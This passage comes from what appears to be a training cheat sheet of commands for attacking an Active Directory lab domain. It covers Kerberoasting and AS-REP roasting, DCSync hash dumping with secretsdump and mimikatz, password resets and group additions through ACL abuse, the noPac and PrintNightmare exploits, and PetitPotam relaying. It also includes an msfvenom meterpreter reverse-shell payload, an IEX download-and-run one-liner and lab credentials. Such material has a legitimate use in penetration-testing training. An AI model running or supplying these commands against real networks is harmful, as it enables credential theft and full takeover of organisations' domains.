nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host.|\n|`sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host.|\n|`sudo nxc smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users`|Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host.|\n|`sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares`|Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host.|\n|`sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share`|Authenticates with a Windows target over `smb` using valid credentials and utilizes the nxc module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files. The results are outputted in `JSON`. Performed from a Linux-based host.|\n|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5`|Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host.|\n|`smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only`|Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host.|\n|`rpcclient $> queryuser 0x457`|Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host.|\n|`rpcclient $> enumdomusers`|Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host.|\n|`psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125`|Impacket tool used to connect to the `CLI` of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host.|\n|`wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5`|Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host.|\n|`windapsearch.py -h`|Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host.|\n|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p transporter@4 --da`|Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host.|\n|`python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\\wley -p transporter@4 -PU`|Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host.|\n|`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`|Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`) as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host.|\n\n# Enumeration by Living Off the Land\n\n|Command|Description|\n|---|---|\n|`Get-Module`|PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.|\n|`Import-Module ActiveDirectory`|Loads the `Active Directory` PowerShell module from a Windows-based host.|\n|`Get-ADDomain`|PowerShell cmd-let used to gather Windows domain information from a Windows-based host.|\n|`Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName`|PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host.|\n|`Get-ADTrust -Filter *`|PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host.|\n|`Get-ADGroup -Filter * \\| select name`|PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host.|\n|`Get-ADGroup -Identity \"Backup Operators\"`|PowerShell cmd-let used to search for a specifc group (`-Identity \"Backup Operators\"`). Performed from a Windows-based host.|\n|`Get-ADGroupMember -Identity \"Backup Operators\"`|PowerShell cmd-let used to discover the members of a specific group (`-Identity \"Backup Operators\"`). Performed from a Windows-based host.|\n|`Export-PowerViewCSV`|PowerView script used to append results to a `CSV` file. Performed from a Windows-based host.|\n|`ConvertTo-SID`|PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host.|\n|`Get-DomainSPNTicket`|PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host.|\n|`Get-Domain`|PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.|\n|`Get-DomainController`|PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.|\n|`Get-DomainUser`|PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.|\n|`Get-DomainComputer`|PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.|\n|`Get-DomainGroup`|PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.|\n|`Get-DomainOU`|PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.|\n|`Find-InterestingDomainAcl`|PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.|\n|`Get-DomainGroupMember`|PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.|\n|`Get-DomainFileServer`|PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.|\n|`Get-DomainDFSShare`|PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.|\n|`Get-DomainGPO`|PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.|\n|`Get-DomainPolicy`|PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.|\n|`Get-NetLocalGroup`|PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.|\n|`Get-NetLocalGroupMember`|PowerView script enumerate members of a specific local group. Performed from a Windows-based host.|\n|`Get-NetShare`|PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.|\n|`Get-NetSession`|PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.|\n|`Test-AdminAccess`|PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.|\n|`Find-DomainUserLocation`|PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.|\n|`Find-DomainShare`|PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.|\n|`Find-InterestingDomainShareFile`|PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.|\n|`Find-LocalAdminAccess`|PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.|\n|`Get-DomainTrust`|PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.|\n|`Get-ForestTrust`|PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.|\n|`Get-DomainForeignUser`|PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.|\n|`Get-DomainForeignGroupMember`|PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.|\n|`Get-DomainTrustMapping`|PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.|\n|`Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse`|PowerView script used to list all the members of a target group (`\"Domain Admins\"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host.|\n|`Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName`|PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host.|\n|`.\\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data`|Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.|\n\n# Transfering Files\n\n| Command                                                                                                                  | Description                                                                                          |\n| ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------- |\n| `sudo python3 -m http.server 8001`                                                                                       | Starts a python web server for quick hosting of files. Performed from a Linux-basd host.             |\n| `\"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')\"`                                   | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |\n| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host.     |\n\n# Kerberoasting\n\n|Command|Description|\n|---|---|\n|`sudo python3 -m pip install .`|Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.|\n|`GetUserSPNs.py -h`|Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host.|\n|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday`|Impacket tool used to get a list of `SPNs` on the target Windows domain from a Linux-based host.|\n|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request`|Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host.|\n|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev`|Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host.|\n|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs`|Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host.|\n|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force`|Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host.|\n|`setspn.exe -Q */*`|Used to enumerate `SPNs` in a target Windows domain from a Windows-based host.|\n|`Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"`|PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.|\n|`setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \\| Select-String '^CN' -Context 0,1 \\| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }`|Used to download/request all TGS tickets from a WIndows-based host.|\n|`mimikatz # base64 /out:true`|`Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host.|\n|`kerberos::list /export`|`Mimikatz` command used to extract the TGS tickets from a Windows-based host.|\n|`echo \"<base64 blob>\" \\| tr -d \\\\n`|Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.|\n|`cat encoded_file \\| base64 -d > sqldev.kirbi`|Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host.|\n|`python2.7 kirbi2john.py sqldev.kirbi`|Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host.|\n|`sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > sqldev_tgs_hashcat`|Used to modify the `crack_file` for `Hashcat` from a Linux-based host.|\n|`cat sqldev_tgs_hashcat`|Used to view the prepared hash from a Linux-based host.|\n|`hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`|Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host.|\n|`Import-Module .\\PowerView.ps1 Get-DomainUser * -spn \\| select samaccountname`|Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host.|\n|`Get-DomainUser -Identity sqldev \\| Get-DomainSPNTicket -Format Hashcat`|PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host.|\n|`Get-DomainUser * -SPN \\| Get-DomainSPNTicket -Format Hashcat \\| Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation`|Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host.|\n|`cat .\\ilfreight_tgs.csv`|Used to view the contents of the .csv file from a Windows-based host.|\n|`.\\Rubeus.exe`|Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host.|\n|`.\\Rubeus.exe kerberoast /stats`|Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host.|\n|`.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`|Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host.|\n|`.\\Rubeus.exe kerberoast /user:testspn /nowrap`|Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host.|\n|`Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes`|PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host.|\n|`hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt`|Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host .|\n\n# ACL Enumeration & Tactics\n\n|Command|Description|\n|---|---|\n|`Find-InterestingDomainAcl`|PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.|\n|`Import-Module .\\PowerView.ps1 $sid = Convert-NameToSid wley`|Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host.|\n|`Get-DomainObjectACL -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}`|Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host.|\n|`$guid= \"00299570-246d-11d0-a768-00aa006e0529\" Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \\| Select Name,DisplayName,DistinguishedName,rightsGuid \\| ?{$_.rightsGuid -eq $guid} \\| fl`|Used to perform a reverse search & map to a `GUID` value from a Windows-based host.|\n|`Get-DomainObjectACL -ResolveGUIDs -Identity * \\| ? {$_.SecurityIdentifier -eq $sid}`|Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host.|\n|`Get-ADUser -Filter * \\| Select-Object -ExpandProperty SamAccountName > ad_users.txt`|Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host.|\n|`foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl \"AD:\\$(Get-ADUser $line)\" \\| Select-Object Path -ExpandProperty Access \\| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}`|A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.|\n|`$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\wley', $SecPassword)`|Used to create a `PSCredential Object` from a Windows-based host.|\n|`$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`|Used to create a `SecureString Object` from a Windows-based host.|\n|`Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`|PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host.|\n|`Get-ADGroup -Identity \"Help Desk Level 1\" -Properties * \\| Select -ExpandProperty Members`|PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host.|\n|`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`|PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host.|\n|`Get-DomainGroupMember -Identity \"Help Desk Level 1\" \\| Select MemberName`|PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host.|\n|`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`|PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host.|\n|`Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`|PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host.|\n|`Remove-DomainGroupMember -Identity \"Help Desk Level 1\" -Members 'damundsen' -Credential $Cred2 -Verbose`|PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host.|\n|`ConvertFrom-SddlString`|PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host.|\n\n# DCSync\n\n|Command|Description|\n|---|---|\n|`Get-DomainUser -Identity adunn \\| select samaccountname,objectsid,memberof,useraccountcontrol \\|fl`|PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host.|\n|`$sid= \"S-1-5-21-3842939050-3880317879-2865463114-1164\" Get-ObjectAcl \"DC=inlanefreight,DC=local\" -ResolveGUIDs \\| ? { ($_.ObjectAceType -match 'Replication-Get')} \\| ?{$_.SecurityIdentifier -match $sid} \\| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \\| fl`|Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host.|\n|`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss`|Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host.|\n|`mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator`|Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host.|\n\n# Privileged Access\n\n|Command|Description|\n|---|---|\n|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"`|PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host.|\n|`Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"`|PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host.|\n|`$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force`|Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host.|\n|`$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)`|Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host.|\n|`Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred`|Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`).|\n|`evil-winrm -i 10.129.201.234 -u forend`|Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`.|\n|`Import-Module .\\PowerUpSQL.ps1`|Used to import the `PowerUpSQL` tool.|\n|`Get-SQLInstanceDomain`|PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.|\n|`Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'`|PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host.|\n|`mssqlclient.py`|Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host.|\n|`mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth`|Impacket tool used to connect to a MSSQL server from a Linux-based host.|\n|`SQL> help`|Used to display mssqlclient.py options once connected to a MSSQL server.|\n|`SQL> enable_xp_cmdshell`|Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host.|\n|`xp_cmdshell whoami /priv`|Used to enumerate rights on a system using `xp_cmdshell`.|\n\n# NoPac\n\n|Command|Description|\n|---|---|\n|`sudo git clone https://github.com/Ridter/noPac.git`|Used to clone a `noPac` exploit using git. Performed from a Linux-based host.|\n|`sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap`|Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host.|\n|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap`|Used to exploit the `noPac`/`Sam_The_Admin` vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host.|\n|`sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator`|Used to exploit the `noPac`/`Sam_The_Admin` vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host.|\n\n# PrintNightmare\n\n|Command|Description|\n|---|---|\n|`git clone https://github.com/cube0x0/CVE-2021-1675.git`|Used to clone a PrintNightmare exploit using git from a Linux-based host.|\n|`pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install`|Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.|\n|`rpcdump.py @172.16.5.5 \\| egrep 'MS-RPRN\\|MS-PAR'`|Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host.|\n|`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll`|Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.|\n|`sudo smbserver.py -smb2support CompData /path/to/backupscript.dll`|Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.|\n|`sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\\\10.129.202.111\\CompData\\backupscript.dll'`|Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.|\n\n# PetitPotam\n\n|Command|Description|\n|---|---|\n|`sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`|Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host.|\n|`git clone https://github.com/topotam/PetitPotam.git`|Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host.|\n|`python3 PetitPotam.py 172.16.5.225 172.16.5.5`|Used to execute the PetitPotam exploit by specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host.|\n|`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 <base64 certificate> = dc01.ccache`|Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host.|\n|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host.|\n|`klist`|`krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host.|\n|`python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`|Used to submit TGS requests using `getnthash.py` from a Linux-based host.|\n|`secretsdump.py -just-dc-user INLANEFREIGHT/administrator \"ACADEMY-EA-DC01$\"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba`|Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host.|\n|`.\\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt`|Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host.|\n|`mimikatz # lsadump::dcsync /user:inlanefreight\\krbtgt`|Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host.|\n\n# Miscellaneous Misconfigurations\n\n|Command|Description|\n|---|---|\n|`Import-Module .\\SecurityAssessment.ps1`|Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host.|\n|`Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host.|\n|`adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5`|Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host.|\n|`adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r`|Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host.|\n|`Get-DomainUser * \\| Select-Object samaccountname,description`|PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host.|\n|`Get-DomainUser -UACFilter PASSWD_NOTREQD \\| Select-Object samaccountname,useraccountcontrol`|PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host.|\n|`ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts`|Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.|\n\n# Group Policy Enumeration & Attacks\n\n|Command|Description|\n|---|---|\n|`gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`|Tool used to decrypt a captured `group policy preference password` from a Linux-based host.|\n|`nxc smb -L \\| grep gpp`|Locates and retrieves a `group policy preference password` using `nxc`, the filters the output using `grep`. Peformed from a Linux-based host.|\n|`nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`|Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `nxc` from a Linux-based host.|\n|`Get-DomainGPO \\| select displayname`|PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.|\n|`Get-GPO -All \\| Select DisplayName`|PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.|\n|`$sid=Convert-NameToSid \"Domain Users\"`|Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host.|\n|`Get-DomainGPO \\| Get-ObjectAcl \\| ?{$_.SecurityIdentifier -eq $sid`|PowerView tool that is used to check if the `Domain Users` (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host.|\n|`Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`|PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host.|\n\n# ASREPRoasting\n\n|Command|Description|\n|---|---|\n|`Get-DomainUser -PreauthNotRequired \\| select samaccountname,userprincipalname,useraccountcontrol \\| fl`|PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host.|\n|`.\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`|Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host.|\n|`hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt`|Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host.|\n|`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`|Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.|\n\n# Trust Relationships - Child > Parent Trusts\n\n|Command|Description|\n|---|---|\n|`Import-Module activedirectory`|Used to import the `Active Directory` module. Performed from a Windows-based host.|\n|`Get-ADTrust -Filter *`|PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.|\n|`Get-DomainTrust`|PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.|\n|`Get-DomainTrustMapping`|PowerView tool used to perform a domain trust mapping from a Windows-based host.|\n|`Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \\| select SamAccountName`|PowerView tools used to enumerate users in a target child domain from a Windows-based host.|\n|`mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt`|Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host.|\n|`Get-DomainSID`|PowerView tool used to get the SID for a target child domain from a Windows-based host.|\n|`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" \\| select distinguishedname,objectsid`|PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host.|\n|`ls 